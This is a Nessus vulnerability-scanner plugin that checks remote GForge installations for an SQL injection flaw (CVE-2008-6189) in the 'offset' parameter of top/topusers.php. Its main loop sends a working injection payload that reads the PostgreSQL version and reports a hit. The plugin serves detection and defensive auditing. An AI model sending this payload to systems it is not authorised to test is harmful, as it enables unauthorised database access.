#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(34399);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2008-6189");
  script_bugtraq_id(31674);
  script_xref(name:"milw0rm", value:"6707");
  script_xref(name:"OSVDB", value:"49146");

  script_name(english:"GForge top/topusers.php offset Parameter SQL Injection");
  script_summary(english:"Tries to exploit SQL injection issue in GForge");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running GForge, an open-source web-based
project-management and collaboration software. 

The installed version of GForge fails to sanitize user-supplied input
to the 'offset' parameter in the 'top/topusers.php' script before
using it in a database query.  Regardless of PHP's 'magic_quotes_gpc'
setting, an unauthenticated attacker can exploit this issue to
manipulate database queries, resulting in disclosure of sensitive
information or attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?75e0279e" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/gforge","/gf", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to discover the PostgreSQL version.
  url = string(dir,"/top/topusers.php?offset=0;select+1,version()+as+user_name,3,4,5;");

  w = http_send_recv3(method:"GET", item:url,port:port);
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  if (
    'a href="/users/PostgreSQL' >< res &&
    "Powered By GForge" >< res &&
    egrep(pattern:">PostgreSQL [0-9]+\..+ on.+compiled by.+",string:res)
  )
  {
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
     
    version = strstr(res,"PostgreSQL");
    version = version - strstr(version,'/">PostgreSQL');	

    if (report_verbosity && version)
    {
      report = string (
        "\n",
        "Nessus was able to exploit this issue to discover the version of\n",
        "PostgreSQL installed on the remote host using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n",
        "\n",
        "It is :\n",
        "\n",
        "  ", version, "\n"
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
  }
}
